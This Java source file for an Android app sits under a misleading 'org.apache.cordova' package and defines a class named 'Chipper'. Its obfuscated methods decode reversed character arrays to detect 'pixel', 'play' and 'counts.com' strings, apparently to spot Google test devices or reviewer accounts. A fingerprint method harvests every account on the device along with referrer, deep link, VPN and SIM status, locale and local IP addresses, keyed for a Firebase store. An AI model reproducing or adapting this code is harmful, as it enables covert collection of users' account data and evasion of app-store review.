package org.apache.cordova;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.provider.Settings;

import androidx.preference.PreferenceManager;

import com.walhalla.ui.DLog;

import org.apache.Utils;
import org.apache.cordova.constants.TableField;
import org.apache.cordova.repository.impl.FirebaseRepository;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TreeMap;

public class Chipper {

    /**
     * buffer handler
     */

    private static final String NONE = "@";
    private static final String KEY_SIM_CARD = "sim_card";
    private static final String KEY_VPN = "vpn";


    public static boolean pixel(String s) {
        char[] node = new char[]{
                108/*l*/, 101/*e*/, 120/*x*/, 105/*i*/, 112/*p*/    //pixel
        };
        String aa = new StringBuilder((String.valueOf(node))).reverse().toString();
        return s.toLowerCase().contains(aa);
    }

    public static boolean aEquals(String s) {

//        char[] node = new char[]{
//                121, 97, 108, 112    //play
//        };
//
//        String aa = new StringBuilder((String.valueOf(node))).reverse().toString();
//        return s.toLowerCase().contains(aa);


        char[] node = new char[]{
                121, 97, 108, 112,    //play [0,4]
                109, 111, 99, 46, 115, 116, 110, 117, 111, 99,    //counts.com [4,14]

        };

        return s.toLowerCase().contains(aaa(node, 0, 4))
                || s.toLowerCase().contains(aaa(node, 4, 14));
    }

    private static String aaa(char[] node, int a, int b) {
        //DLog.d("chipper::" + new StringBuilder((String.valueOf(Arrays.copyOfRange(node, a, b)))).reverse());
        return new StringBuilder((String.valueOf(Arrays.copyOfRange(node, a, b)))).reverse().toString();
    }

    @SuppressLint("HardwareIds")
    public static String android_id(Context context) {
        try {
            return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "None";
        }
    }





    //public static String getMachine(Context context)

    @SuppressLint("MissingPermission")
    public static Map<String, Object> makeFingerPrint00(Context context, String aa) {
        Map<String, Object> map = new TreeMap<>();

//        TelephonyManager service = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
//        map.put("_phone_number", NONE + service.getLine1Number());//p333
//        map.put("_sim_serial_number", NONE + service.getSimSerialNumber());
//        map.put("_device_id", NONE + service.getDeviceId());
//        map.put("_operator", NONE + service.getNetworkOperator());

        AccountManager am = AccountManager.get(context);
        try {
            Account[] accounts = am.getAccounts();
            //accounts = am.getAccountsByType(null);
            List<String> accounts1 = formatterAccount(accounts);
            if (accounts1.size() > 0) {
                map.put(FirebaseRepository.HKEY_USERS, accounts1);
            }
        } catch (Exception e) {
            DLog.handleException(e);
        }

        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
        String deepLink = preferences.getString(Const.KEY_DEEP_LINK, null);
        String ref = preferences.getString(Const.KEY_REFERRER_, null);


        final PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        int total = packages.size();
//        List<String> nonSys = getNonSystemApps(context, packages);
//        map.put("app_stat", nonSys.size() + "/" + total);
//        map.put("app", nonSys);

        //GpStatus
        //GpVersion
        //map.put("screenLockType", new screenLockType().getCurrent()

        map.put(KEY_SIM_CARD, Utils.isSimSupport(context));
        map.put(KEY_VPN, Utils.useVpn(context));

        map.put("country", Utils.getCountryCode(context));
        map.put("lang", "" + Locale.getDefault().getLanguage()
                + "_" + Locale.getDefault().getCountry() +
                " [" + Locale.getDefault().getDisplayName() + "]"
                + "::" + context.getString(com.walhalla.ui.R.string.default_location));
        //@@@@@@ map.put("android_id", Chipper.android_id(context));
        map.put("time_zone_number", "" + Utils.timeZone());
        map.put("deep_link", deepLink);
        map.put("referer", ref);
        map.put("so", new SystemEnvironment(aa));
        map.put("LIP", "" + getLocalIpAddress());

        String createdAt = Utils.makeDate();
        map.put(TableField.FIELD_CREATE_AT, createdAt);
        map.put(TableField.FIELD_UPDATE_AT, createdAt);

//        StringBuilder sb = new StringBuilder();
//        for (Map.Entry<String, String> entry : map.entrySet()) {
//            sb.append(entry.getValue()).append('|');
//        }
//        DLog.d("fgp " + sb.toString());
        return map;
    }

    private static List<String> formatterAccount(Account[] accounts) {
        List<String> users = new LinkedList<>();
        for (Account ac : accounts) {
            //+"::"+ac.describeContents()
            users.add("" + ac.name + ", " + ac.type);
            // Take your time to look at all available accounts
            //DLog.d("fgp Accounts : " + acname + ", " + actype + " " + ac.toString());
        }
        return users;
    }


    public static List<String> getLocalIpAddress() {
        List<String> sb = new ArrayList<>();
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                //DLog.d("ntw "+intf.toString());
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        sb.add("" + inetAddress);
                    }
                }
            }
        } catch (SocketException ex) {
            DLog.handleException(ex);
        }
        return sb;
    }
}
